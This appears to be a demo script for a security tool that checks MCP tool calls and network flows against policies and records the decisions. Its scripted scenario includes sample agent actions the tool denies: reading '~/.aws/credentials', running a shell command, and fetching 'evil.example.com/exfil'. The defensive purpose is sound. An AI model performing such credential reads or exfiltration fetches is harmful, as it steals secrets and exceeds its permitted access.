"""mcp-defense demo — end-to-end pipeline on a scripted scenario.

Composes in-process:
  - PolicyEngine loaded from config/archetypes.yaml
  - Correlator with a 1.5s session window
  - FlightRecorder streaming to the terminal

Plays a scripted sequence of MCP tool calls and kernel flow events that
exercises every major decision path:
  - filesystem archetype allows read under /workspace                 (ALLOW)
  - filesystem archetype denies crown-jewel credential read           (DENY)
  - filesystem archetype denies an exec_command (no-spawn)            (DENY)
  - sensitive .env.local requires approval                            (APPROVE)
  - a flow appears with no matching tool call                         (ORPHAN)
  - filesystem archetype denies an outbound fetch (no-network)        (DENY)
  - github archetype allows a fetch to api.github.com with its flow   (ALLOW)

Real deployments replace the mock scenario with:
  - a StdioProxy or SseProxy wrapping an actual MCP server
  - a JsonLinesFlowSource bridging ternaryphysics-llm-security's XDP ringbuf

No subprocesses launched here — the goal is a repeatable, deterministic
demo of the correlation + policy + recorder wiring.
"""

from __future__ import annotations

import asyncio
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from rich.console import Console

from mcp_defense.correlation.join import Correlator
from mcp_defense.events import FlowEvent, ToolCallEvent
from mcp_defense.policy.archetypes import load_archetypes
from mcp_defense.policy.engine import PolicyEngine
from mcp_defense.proxy.correlation_id import new_correlation_id
from mcp_defense.recorder.flight import FlightRecorder

SCENARIO: list[tuple[float, str, dict[str, Any]]] = [
    (0.1, "tool", dict(
        archetype="filesystem", tool="read_file",
        args={"path": "/workspace/main.py"},
        server_pid=1001, cgroup_id=100,
    )),
    (0.4, "flow", dict(
        src_ip="10.0.0.5", src_port=50001,
        dst_ip="1.2.3.4", dst_port=443,
        classification="LEGITIMATE", action="PASS",
        cgroup_id=100,
    )),
    (1.1, "tool", dict(
        archetype="filesystem", tool="read_file",
        args={"path": "/home/alice/.aws/credentials"},
        server_pid=1001, cgroup_id=100,
    )),
    (2.0, "tool", dict(
        archetype="filesystem", tool="exec_command",
        args={"command": "ls /"},
        server_pid=1001, cgroup_id=100,
    )),
    (2.5, "tool", dict(
        archetype="filesystem", tool="read_file",
        args={"path": "/workspace/app/.env.local"},
        server_pid=1001, cgroup_id=100,
    )),
    (3.2, "flow", dict(
        src_ip="10.0.0.5", src_port=52001,
        dst_ip="5.6.7.8", dst_port=443,
        classification="MALICIOUS", action="DROP",
        cgroup_id=777,  # no live session — orphan
    )),
    (3.8, "tool", dict(
        archetype="filesystem", tool="fetch",
        args={"url": "https://evil.example.com/exfil"},
        server_pid=1001, cgroup_id=100,
    )),
    (5.2, "tool", dict(
        archetype="github", tool="fetch",
        args={"url": "https://api.github.com/repos/x/y"},
        server_pid=1002, cgroup_id=200,
    )),
    (5.5, "flow", dict(
        src_ip="10.0.0.5", src_port=50010,
        dst_ip="140.82.114.5", dst_port=443,
        classification="LEGITIMATE", action="PASS",
        cgroup_id=200,
    )),
]


async def run(config_path: Path) -> None:
    archetypes = load_archetypes(config_path)
    engine = PolicyEngine(archetypes=archetypes)
    # Width=140 keeps the demo rendering consistent across terminals.
    # Short window keeps close-order close to chronological order.
    recorder = FlightRecorder(console=Console(width=140))
    correlator = Correlator(
        action_sink=recorder, window_seconds=0.5, closer_interval=0.05
    )

    recorder.console.rule("[bold]mcp-defense flight recorder — demo[/bold]")
    recorder.console.print()

    await correlator.start()
    start = asyncio.get_event_loop().time()

    for offset, kind, params in SCENARIO:
        target_time = start + offset
        delay = target_time - asyncio.get_event_loop().time()
        if delay > 0:
            await asyncio.sleep(delay)

        if kind == "tool":
            tool_call = ToolCallEvent(
                correlation_id=new_correlation_id(),
                timestamp=datetime.now(timezone.utc),
                agent_id="demo-agent",
                server_archetype=params["archetype"],
                server_pid=params["server_pid"],
                container_id=None,
                tool_name=params["tool"],
                tool_args=params["args"],
                transport="stdio",
                cgroup_id=params["cgroup_id"],
            )
            await correlator.emit(tool_call)
            decision = await engine.evaluate(tool_call)
            await correlator.emit_decision(decision)

        elif kind == "flow":
            flow = FlowEvent(
                timestamp=datetime.now(timezone.utc),
                src_ip=params["src_ip"],
                dst_ip=params["dst_ip"],
                src_port=params["src_port"],
                dst_port=params["dst_port"],
                protocol=6,
                classification=params["classification"],
                action=params["action"],
                confidence=90,
                cgroup_id=params.get("cgroup_id"),
            )
            await correlator.ingest_flow(flow)

    # Let in-flight sessions close.
    await asyncio.sleep(2.0)
    await correlator.stop()
    recorder.print_summary()


def main() -> int:
    config = Path(__file__).resolve().parent.parent / "config" / "archetypes.yaml"
    asyncio.run(run(config))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
